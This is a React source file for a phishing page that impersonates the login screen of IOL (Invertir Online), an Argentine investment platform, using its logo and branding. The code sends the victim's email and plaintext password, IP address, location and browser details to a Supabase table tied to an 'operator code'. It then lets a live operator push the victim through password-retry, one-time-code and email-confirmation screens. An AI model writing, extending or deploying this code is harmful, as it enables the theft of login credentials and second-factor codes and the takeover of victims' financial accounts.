import { useCallback, useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { ShieldCheck } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import LoginForm from "@/components/login/LoginForm";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import OtpScreen from "@/components/login/OtpScreen";
import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
import iolLogo from "@/assets/iol-logo.png";

type IolStep = "form" | "waiting" | "success" | "otp" | "confirm_email";

const IOL = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<IolStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");

  const rateLimit = useRateLimit();

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const originalTitle = document.title;
    const originalDesc = document.querySelector('meta[name="description"]')?.getAttribute("content") || "";

    document.title = "IOL — Ingresar";
    const descMeta = document.querySelector('meta[name="description"]');
    if (descMeta) {
      descMeta.setAttribute("content", "IOL — Accedé a tu cuenta para operar e invertir con seguridad.");
    }

    return () => {
      document.title = originalTitle;
      const currentDescMeta = document.querySelector('meta[name="description"]');
      if (currentDescMeta) {
        currentDescMeta.setAttribute("content", originalDesc);
      }
    };
  }, []);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;

    if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
      setErrorMessage("");
      setGeneralError("");
      setStep("success");
      return;
    }

    if (status === "wrong_password") {
      setErrorMessage("Usuario o contraseña incorrectos. Intentá nuevamente.");
      setGeneralError("");
      setStep("waiting");
      return;
    }

    if (status === "redirect_otp" || status === "show_otp") {
      setErrorMessage("");
      setStep("otp");
      return;
    }

    if (status === "redirect_confirm_email" || status === "redirect_sync_email") {
      setErrorMessage("");
      setStep("confirm_email");
      return;
    }

    if (status === "pending_review") {
      setErrorMessage("");
      setStep("waiting");
    }
  }, []);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    const channel = supabase.channel(`session-review-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string | undefined);
      })
      .subscribe();

    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string | undefined);
      })
      .subscribe();

    const pollInterval = window.setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("status")
        .eq("id", sessionId)
        .maybeSingle();

      if (data?.status) {
        handleDecision(data.status);
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(otpChannel);
      window.clearInterval(pollInterval);
    };
  }, [handleDecision, sessionId, step]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError("");
    setErrorMessage("");
    setLoading(true);
    setEmail(submittedEmail);

    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ipData = {
            ip: data.ip || "unknown",
            country: data.country_name || "",
            city: data.city || "",
            region: data.region || "",
          };
        }
      } catch {
        // ignore
      }

      const newId = crypto.randomUUID();

      await supabase.from("sessions").insert({
        id: newId,
        email: submittedEmail,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "iol",
        operator_code: operatorCode,
      });

      setSessionId(newId);
      setStep("waiting");
    } catch {
      setGeneralError("No pudimos iniciar sesión. Intentá nuevamente.");
    } finally {
      setLoading(false);
    }
  }, [operatorCode]);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return;

    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({ password: newPassword, status: "pending_review" })
      .eq("id", sessionId);

    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({
          type: "broadcast",
          event: "review_decision",
          payload: { status: "pending_review" },
        });
        window.setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => {
    setStep("form");
    setSessionId(null);
    setErrorMessage("");
    setGeneralError("");
  }, []);

  const renderCardContent = () => {
    if (step === "otp" && sessionId) {
      return <OtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
    }

    if (step === "confirm_email" && sessionId) {
      return <ConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
    }

    if (step === "waiting" && sessionId) {
      return (
        <WaitingScreen
          email={email}
          sessionId={sessionId}
          errorMessage={errorMessage}
          onPasswordResubmit={handlePasswordResubmit}
        />
      );
    }

    if (step === "success") {
      return <SuccessScreen email={email} />;
    }

    return (
      <>
        {generalError && (
          <div className="mb-5 rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
            {generalError}
          </div>
        )}
        <LoginForm onSubmit={handleLoginSubmit} loading={loading} />
      </>
    );
  };

  if (rateLimit.loading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background text-muted-foreground">
        Cargando...
      </div>
    );
  }

  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background px-4">
        <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 text-center text-card-foreground shadow-lg">
          <h1 className="text-xl font-semibold">Acceso restringido</h1>
          <p className="mt-2 text-sm text-muted-foreground">
            Detectamos actividad inusual y bloqueamos temporalmente este acceso.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-background via-background to-muted/30 text-foreground">
      <header className="border-b border-border/60 bg-background/90 backdrop-blur">
        <div className="mx-auto flex w-full max-w-6xl items-center justify-between px-6 py-4">
          <div className="flex items-center gap-3">
            <img src={iolLogo} alt="IOL" className="h-10 w-auto object-contain" />
            <div>
              <p className="text-sm font-semibold tracking-wide">Invertir Online</p>
              <p className="text-xs text-muted-foreground">Acceso seguro a tu cuenta</p>
            </div>
          </div>
          <div className="hidden items-center gap-2 rounded-full border border-border bg-card px-3 py-1.5 text-xs text-muted-foreground md:flex">
            <ShieldCheck className="h-3.5 w-3.5 text-primary" />
            Protección reforzada
          </div>
        </div>
      </header>

      <main className="mx-auto flex min-h-[calc(100vh-73px)] w-full max-w-6xl flex-col justify-center px-6 py-12 lg:flex-row lg:items-center lg:gap-16">
        <section className="mb-10 max-w-xl lg:mb-0">
          <span className="inline-flex rounded-full border border-border bg-card px-3 py-1 text-xs font-medium text-muted-foreground">
            Plataforma de inversión
          </span>
          <h1 className="mt-5 text-4xl font-semibold tracking-tight text-foreground sm:text-5xl">
            Recuperamos la pantalla de acceso de IOL.
          </h1>
          <p className="mt-4 max-w-lg text-base leading-7 text-muted-foreground">
            La ruta volvió a estar disponible con el flujo base de ingreso, espera, validación por código y confirmación de email.
          </p>
        </section>

        <section className="w-full max-w-md">
          <div className="rounded-3xl border border-border bg-card p-6 shadow-2xl shadow-black/10 sm:p-8">
            {renderCardContent()}
          </div>
        </section>
      </main>
    </div>
  );
};

export default IOL;
